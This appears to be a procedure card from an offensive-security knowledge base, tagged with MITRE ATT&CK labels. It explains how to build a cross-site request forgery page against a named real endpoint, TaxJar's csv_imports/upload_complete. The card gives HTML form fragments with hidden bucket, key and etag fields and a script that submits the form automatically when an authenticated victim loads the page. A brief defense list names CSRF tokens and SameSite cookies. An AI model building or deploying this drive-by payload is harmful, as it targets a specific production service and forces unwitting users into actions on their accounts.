---
id: proc-uuid-4
tags:
  - csrf-payload
  - html-form
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:43.191Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-CSRF-Payload-Form

## Summary

Create a malicious HTML form that submits the S3 parameters via GET to TaxJar's upload_complete endpoint, exploiting the lack of CSRF protection.

## Description

The form targets https://app.taxjar.com/csv_imports/upload_complete with hidden inputs for bucket, key, and etag. Auto-submission via JavaScript ensures drive-by execution when the victim loads the page while authenticated.

## Requirements

1. Extracted parameters from dropped response
2. Basic HTML/JavaScript knowledge

## Defense

Defensive measures and detection strategies:

- Add CSRF tokens to upload_complete GET endpoint
- SameSite cookies and origin checks

## Objectives

1. Embed S3 parameters securely
2. Enable automatic submission
3. Test form locally before deployment

## Instructions

### Step 1: Write HTML Form

**Context**: Build the basic structure.

Create index.html with <form method="GET" action="https://app.taxjar.com/csv_imports/upload_complete">, adding <input type="hidden" name="bucket" value="taxjar-prod-bucket">, similarly for key and etag.

### Step 2: Add Auto-Submit Script

**Context**: Trigger submission on page load.

Include <script>document.forms[0].submit();</script> at the end to auto-submit without user interaction.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf-craft]]
